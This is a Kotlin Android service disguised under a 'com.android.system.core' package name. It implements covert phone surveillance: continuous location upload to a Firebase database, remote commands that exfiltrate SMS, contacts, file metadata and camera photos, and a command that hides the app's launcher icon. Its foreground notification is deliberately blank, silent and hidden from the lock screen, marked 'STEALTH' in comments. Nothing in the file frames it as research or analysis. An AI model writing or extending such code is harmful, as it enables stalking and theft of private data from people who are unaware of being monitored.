package com.android.system.core.location

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.android.system.core.contacts.ContactsReader
import com.android.system.core.camera.CameraSnapshotWorker
import com.android.system.core.files.FileMetaReader
import com.android.system.core.sms.SmsReader
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.collect
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import javax.inject.Inject

@AndroidEntryPoint
class LocationForegroundService : Service() {

    @Inject
    lateinit var repository: LocationRepository
    @Inject
    lateinit var fusedLocationClient: FusedLocationProviderClient
    
    private lateinit var locationManager: LocationManager
    private var currentLocationProvider: String = "fused"
    private lateinit var deviceId: String

    private val serviceJob = SupervisorJob()
    private val scope = CoroutineScope(serviceJob + Dispatchers.Default)
    private var loopJob: Job? = null
    private var configListenerJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var isLocationTrackingActive = true
    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(result: LocationResult) {
            result.lastLocation?.let { location ->
                // Only process location if tracking is enabled
                if (!isLocationTrackingActive) {
                    if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Location received but tracking is disabled, ignoring") }
                    return
                }
                
                if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Lat: ${location.latitude}, Lng: ${location.longitude}") }
                val lat = location.latitude
                val lng = location.longitude
                val accuracy = location.accuracy
                if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Location received: lat=$lat, lng=$lng, accuracy=$accuracy") }
                
                // Upload to Firebase with actual accuracy
                uploadLocationToFirebase(lat, lng, accuracy)
            } ?: run {
                if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Location is null - no location data available") }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (BuildConfig.DEBUG) { Log.d("LocationForegroundService", "📍 Service created") }
        
        // Initialize deviceId now that Context is available
        deviceId = getOrCreateDeviceId()
        
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        
        // Acquire WakeLock to prevent Doze mode
        acquireWakeLock()
        
        // ✅ Notification channel yaratish
        createChannel()  // ✅ QO'SHILADI
        
        // Start foreground immediately
        startForeground(NOTIFICATION_ID, buildNotification())  // ✅ UPDATE
        
        // Start location updates with multiple providers
        startLocationUpdatesWithFallback()
        
        repository.listenTrackingConfig()
        scope.launch(Dispatchers.IO) {
            try {
                repository.markUserOnline()
            } catch (e: Exception) {
                if (BuildConfig.DEBUG) { Log.e(TAG, "markUserOnline", e) }
            }
        }
        
        // Firebase listener for hideLauncher command
        val currentUid = FirebaseAuth.getInstance().currentUser?.uid
        if (currentUid != null) {
            val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
                .getReference("devices").child(currentUid).child("commands")
            val deviceRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
                .getReference("devices").child(currentUid).child("location")
            
            commandsRef.child("hideLauncher").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "hideLauncher data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return
                    
                    // Prevent duplicate execution when status is updated
                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
                    
                    val commandNodeRef = commandsRef.child("hideLauncher")
                    
                    // Write ack status immediately
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))
                    
                    scope.launch {
                        try {
                            val component = ComponentName(
                                this@LocationForegroundService,
                                "com.android.system.core.StartupActivityAlias"
                            )
                            packageManager.setComponentEnabledSetting(
                                component,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias disabled") }
                            deviceRef.child("location").child("launcherHidden").setValue(true)
                            
                            // Write done status
                            updateCommandStatus(commandNodeRef, "done")
                            
                            // Clear after 5 seconds
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to disable launcher alias: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            
                            // Clear after 5 seconds
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }
                
                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Hide launcher listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Hide launcher listener started for device: $currentUid") }
            
            // Firebase listener for syncSms command
            commandsRef.child("syncSms").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncSms data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return

                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return

                    val commandNodeRef = commandsRef.child("syncSms")

                    // ack status
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))

                    scope.launch(Dispatchers.IO) {
                        try {
                            SmsReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
                                if (success) {
                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms done") }
                                    updateCommandStatus(commandNodeRef, "done")
                                } else {
                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms failed") }
                                    updateCommandStatus(commandNodeRef, "failed", "SMS read/upload error")
                                }
                                scope.launch {
                                    delay(5000L)
                                    commandNodeRef.setValue(null)
                                }
                            }
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms exception: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncSms listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncSms listener started for device: $currentUid") }

            // Firebase listener for syncContacts command
            commandsRef.child("syncContacts").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncContacts data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return

                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return

                    val commandNodeRef = commandsRef.child("syncContacts")
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))

                    scope.launch(Dispatchers.IO) {
                        try {
                            ContactsReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
                                if (success) {
                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts done") }
                                    updateCommandStatus(commandNodeRef, "done")
                                } else {
                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts failed") }
                                    updateCommandStatus(commandNodeRef, "failed", "Contacts read/upload error")
                                }
                                scope.launch {
                                    delay(5000L)
                                    commandNodeRef.setValue(null)
                                }
                            }
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts exception: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncContacts listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncContacts listener started for device: $currentUid") }

            // Firebase listener for syncFiles command
            commandsRef.child("syncFiles").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "syncFiles data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return

                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return

                    val commandNodeRef = commandsRef.child("syncFiles")
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))

                    scope.launch(Dispatchers.IO) {
                        try {
                            FileMetaReader(this@LocationForegroundService).readAndUpload(currentUid) { success ->
                                if (success) {
                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles done") }
                                    updateCommandStatus(commandNodeRef, "done")
                                } else {
                                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles failed") }
                                    updateCommandStatus(commandNodeRef, "failed", "Files read/upload error")
                                }
                                scope.launch {
                                    delay(5000L)
                                    commandNodeRef.setValue(null)
                                }
                            }
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles exception: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "syncFiles listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ syncFiles listener started for device: $currentUid") }

            // Firebase listener for takePhoto command
            commandsRef.child("takePhoto").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "takePhoto data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return

                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return

                    val commandNodeRef = commandsRef.child("takePhoto")
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))

                    scope.launch(Dispatchers.IO) {
                        try {
                            CameraSnapshotWorker(this@LocationForegroundService).takePhoto(currentUid) { success ->
                                if (success) {
                                    if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto done") }
                                    updateCommandStatus(commandNodeRef, "done")
                                } else {
                                    if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto failed") }
                                    updateCommandStatus(commandNodeRef, "failed", "Camera capture error")
                                }
                                scope.launch {
                                    delay(5000L)
                                    commandNodeRef.setValue(null)
                                }
                            }
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto exception: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "takePhoto listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ takePhoto listener started for device: $currentUid") }

            // Firebase listener for showLauncher command
            commandsRef.child("showLauncher").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "showLauncher data changed, exists: ${snapshot.exists()}") }
                    if (!snapshot.exists() || snapshot.getValue() == null) return
                    
                    // Prevent duplicate execution when status is updated
                    val currentStatus = snapshot.child("status").getValue(String::class.java)
                    if (currentStatus == "ack" || currentStatus == "done" || currentStatus == "failed") return
                    
                    val commandNodeRef = commandsRef.child("showLauncher")
                    
                    // Write ack status immediately
                    commandNodeRef.updateChildren(mapOf(
                        "status" to "ack",
                        "ackedAt" to ServerValue.TIMESTAMP
                    ))
                    
                    scope.launch {
                        try {
                            val component = ComponentName(
                                this@LocationForegroundService,
                                "com.android.system.core.StartupActivityAlias"
                            )
                            packageManager.setComponentEnabledSetting(
                                component,
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Launcher alias enabled") }
                            deviceRef.child("location").child("launcherHidden").setValue(false)
                            
                            // Write done status
                            updateCommandStatus(commandNodeRef, "done")
                            
                            // Clear after 5 seconds
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to enable launcher alias: ${e.message}") }
                            updateCommandStatus(commandNodeRef, "failed", e.message)
                            
                            // Clear after 5 seconds
                            delay(5000L)
                            commandNodeRef.setValue(null)
                        }
                    }
                }
                
                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Show launcher listener cancelled: ${error.message}") }
                }
            })
            if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Show launcher listener started for device: $currentUid") }
        }
        
        loopJob = scope.launch {
            while (isActive) {
                try {
                    // Get current config from StateFlow
                    val config = repository.trackingConfig.value
                    val intervalMs = config.intervalSeconds * 1000L
                    
                    // Only process tracking cycle if tracking is enabled
                    if (config.trackingEnabled) {
                        repository.processTrackingCycle()
                        repository.syncOfflineBufferIfNeeded()
                    }
                    
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Tracking cycle completed, next interval: ${config.intervalSeconds}s") }
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "tick", e) }
                }
                
                // Use dynamic interval from config
                val config = repository.trackingConfig.value
                val intervalMs = config.intervalSeconds * 1000L
                delay(intervalMs)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (BuildConfig.DEBUG) { Log.d("LocationForegroundService", "📍 Service started") }
        
        // ✅ Notification bilan foreground start
        val notification = buildNotification()  // ✅ QO'SHILADI
        startForeground(NOTIFICATION_ID, notification)    // ✅ UPDATE
        
        // Location updates boshlash (allaqachon bor bo'lsa, bu saqlanadi)
        startLocationUpdatesWithFallback()
        
        return START_STICKY
    }

    override fun onDestroy() {
        if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Service onDestroy called") }
        loopJob?.cancel()
        configListenerJob?.cancel()
        repository.stopListeningTrackingConfig()
        
        // Stop location updates
        stopLocationUpdates()
        
        // Release WakeLock
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
            }
        }
        
        runBlocking(Dispatchers.IO) {
            try {
                repository.markUserOffline()
            } catch (e: Exception) {
                if (BuildConfig.DEBUG) { Log.e(TAG, "markUserOffline", e) }
            }
        }
        serviceJob.cancel()
        super.onDestroy()
    }

    private fun startTrackingLoop() {
        loopJob = scope.launch {
            while (isActive) {
                try {
                    // Get current config from StateFlow
                    val config = repository.trackingConfig.value
                    val intervalMs = config.intervalSeconds * 1000L
                    
                    // Only process tracking cycle if tracking is enabled
                    if (config.trackingEnabled) {
                        repository.processTrackingCycle()
                        repository.syncOfflineBufferIfNeeded()
                    }
                    
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Tracking cycle completed, next interval: ${config.intervalSeconds}s") }
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) { Log.e(TAG, "tracking cycle error", e) }
                }
                
                // Use dynamic interval from config
                val config = repository.trackingConfig.value
                val intervalMs = config.intervalSeconds * 1000L
                delay(intervalMs)
            }
        }
    }

    private fun stopLocationUpdates() {
        try {
            fusedLocationClient.removeLocationUpdates(locationCallback)
            if (BuildConfig.DEBUG) { Log.d(TAG, "Location updates stopped") }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "Error stopping location updates: ${e.message}") }
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LocationService:WakeLock"
            )
            wakeLock?.acquire(10*60*1000L) // 10 minutes
            if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "WakeLock acquired") }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to acquire WakeLock: ${e.message}") }
        }
    }

    private fun startLocationUpdatesWithFallback() {
        try {
            // Priority 1: FusedLocationProvider
            if (isProviderAvailable("fused")) {
                startFusedLocationUpdates()
                return
            }
            
            // Priority 2: GPS
            if (isProviderAvailable(LocationManager.GPS_PROVIDER)) {
                startGpsLocationUpdates()
                return
            }
            
            // Priority 3: Network
            if (isProviderAvailable(LocationManager.NETWORK_PROVIDER)) {
                startNetworkLocationUpdates()
                return
            }
            
            // Priority 4: IP Geolocation (fallback)
            startIpGeolocationUpdates()
            
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to start location updates: ${e.message}") }
        }
    }
    
    private fun isProviderAvailable(provider: String): Boolean {
        return when (provider) {
            "fused" -> true // Fused provider is always available
            LocationManager.GPS_PROVIDER -> {
                locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
            }
            LocationManager.NETWORK_PROVIDER -> {
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            }
            else -> false
        }
    }
    
    private fun startFusedLocationUpdates() {
        try {
            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L)
                .setIntervalMillis(5000L)
                .setMinUpdateIntervalMillis(2000L)
                .setMaxUpdateDelayMillis(10000L)
                .build()

            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                mainLooper
            )
            currentLocationProvider = "fused"
            if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Fused location updates started with 5s interval") }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to start fused location updates: ${e.message}") }
            startLocationUpdatesWithFallback() // Try next provider
        }
    }
    
    private fun startGpsLocationUpdates() {
        try {
            // For GPS, we'll use the location manager directly
            currentLocationProvider = "gps"
            if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "GPS location updates started") }
            // Note: GPS implementation would require LocationListener
            // For now, fallback to network
            startNetworkLocationUpdates()
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to start GPS location updates: ${e.message}") }
            startNetworkLocationUpdates()
        }
    }
    
    private fun startNetworkLocationUpdates() {
        try {
            currentLocationProvider = "network"
            if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Network location updates started") }
            // Note: Network implementation would require LocationListener
            // For now, fallback to IP geolocation
            startIpGeolocationUpdates()
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to start network location updates: ${e.message}") }
            startIpGeolocationUpdates()
        }
    }
    
    private fun startIpGeolocationUpdates() {
        try {
            currentLocationProvider = "ip"
            if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "IP geolocation updates started") }
            // Start periodic IP geolocation
            scope.launch {
                while (isActive) {
                    try {
                        val location = getIpLocation()
                        if (location != null) {
                            uploadLocationToFirebase(location.latitude, location.longitude, location.accuracy)
                        }
                    } catch (e: Exception) {
                        if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "IP geolocation failed: ${e.message}") }
                    }
                    delay(10000L) // 10 seconds for IP geolocation
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "Failed to start IP geolocation updates: ${e.message}") }
        }
    }
    
    private suspend fun getIpLocation(): Location? {
        return try {
            val url = URL("https://ipapi.co/json/")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            
            val response = connection.inputStream.bufferedReader().use { it.readText() }
            connection.disconnect()
            
            // Parse JSON response (simplified)
            val lat = extractDoubleFromJson(response, "latitude")
            val lng = extractDoubleFromJson(response, "longitude")
            
            if (lat != null && lng != null) {
                val location = Location("ip")
                location.latitude = lat
                location.longitude = lng
                location.accuracy = 1000f // IP location is less accurate
                location.time = System.currentTimeMillis()
                return location
            }
            null
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_LOC", "IP geolocation error: ${e.message}") }
            null
        }
    }
    
    private fun extractDoubleFromJson(json: String, key: String): Double? {
        return try {
            val pattern = "\"$key\"\\s*:\\s*([0-9.-]+)".toRegex()
            val match = pattern.find(json)
            match?.groupValues?.get(1)?.toDouble()
        } catch (e: Exception) {
            null
        }
    }
    
    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 12)
            prefs.edit().putString("device_id", deviceId).apply()
        }
        return deviceId
    }

    private fun uploadLocationToFirebase(lat: Double, lng: Double, accuracy: Float = 10f) {
        try {
            if (BuildConfig.DEBUG) { Log.d("DEBUG_FIREBASE", "Firebase write attempt: lat=$lat, lng=$lng") }
            
            val auth = FirebaseAuth.getInstance()
            val user = auth.currentUser
            if (user == null) {
                auth.signInAnonymously().addOnSuccessListener {
                    uploadLocationToFirebase(lat, lng, accuracy)
                }.addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e("DEBUG_FIREBASE", "Anonymous auth failed: ${e.message}") }
                }
                return
            }
            val email = user.email ?: ""
            
            // Get device info
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            val battery = getBatteryLevel()

            // AES shifrlash: kalit mavjud bo'lsa lat/lng ni shifrlash
            val aesKey = KeyFetchWorker.getAesKey(this)
            val latValue: Any = if (aesKey != null) {
                CryptoManager.encrypt(lat.toString(), aesKey) ?: lat
            } else {
                if (BuildConfig.DEBUG) { Log.w(TAG, "AES key not available, writing plain lat/lng") }
                lat
            }
            val lngValue: Any = if (aesKey != null) {
                CryptoManager.encrypt(lng.toString(), aesKey) ?: lng
            } else {
                lng
            }
            
            val locationData = mapOf(
                "lat" to latValue,
                "lng" to lngValue,
                "accuracy" to accuracy,
                "speed" to 0.0,
                "bearing" to 0.0,
                "altitude" to 0.0,
                "provider" to currentLocationProvider,
                "battery" to battery,
                "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP,
                "isOnline" to true,
                "deviceId" to deviceId,
                "deviceName" to deviceName,
                "email" to email,
                "status" to "online",
                "lastUpdated" to com.google.firebase.database.ServerValue.TIMESTAMP
            )
            
            FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
                .getReference("devices")
                .child(user.uid)
                .child("location")
                .updateChildren(locationData)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d("DEBUG_LOC", "Firebase Write Success - Location uploaded to devices/${user.uid}/location") }
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e("DEBUG_FIREBASE", "Firebase write failed: ${e.message}") }
                }
                
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e("DEBUG_FIREBASE", "Upload to Firebase error: ${e.message}") }
        }
    }
    
    private fun updateCommandStatus(
        commandRef: DatabaseReference,
        status: String,
        error: String? = null
    ) {
        val updates = mutableMapOf<String, Any>(
            "status" to status,
            "completedAt" to ServerValue.TIMESTAMP
        )
        error?.let { updates["error"] = it }
        
        commandRef.updateChildren(updates)
            .addOnSuccessListener {
                if (BuildConfig.DEBUG) { Log.d(TAG, "Command status updated to $status") }
            }
            .addOnFailureListener { e ->
                if (BuildConfig.DEBUG) { Log.e(TAG, "Failed to update command status: ${e.message}") }
            }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val batteryIntent = registerReceiver(null, 
                android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else 0
        } catch (e: Exception) { 0 }
    }

    private fun buildNotification(): Notification {
        createChannel()
        return NotificationCompat.Builder(this, "location_service_channel")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)  // ✅ Subtle icon
            .setContentTitle("")                                 // ✅ Bo'sh sarlavha
            .setContentText("")                                  // ✅ Bo'sh matn
            .setPriority(NotificationCompat.PRIORITY_MIN)           // ✅ Eng past prioritet
            .setOngoing(true)                                 // ✅ Doimiy faol
            .setOnlyAlertOnce(true)                             // ✅ Bir marta ogohlantirish
            .setSilent(true)                                   // ✅ Tovuqsiz
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)      // ✅ Blok ekranda ko'rinmas
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)  // ✅ Tez ishga tushirish
            .build()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            "location_service_channel",
            "Location Service",
            NotificationManager.IMPORTANCE_MIN  // ✅ STEALTH - eng past prioritet
        ).apply {
            description = "Background location tracking"
            enableLights(false)              // ✅ LED chiroqni o'chirish
            enableVibration(false)            // ✅ Tebranishni o'chirish
            setSound(null, null)              // ✅ Ovozni o'chirish
            setShowBadge(false)               // ✅ Badjini o'chirish
        }
        nm.createNotificationChannel(channel)
        if (BuildConfig.DEBUG) { Log.d("LocationForegroundService", "✅ IMPORTANCE_MIN channel created") }
    }

    companion object {
        private const val TAG = "SYS_CORE_FG"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "location_service_channel"
    }
}
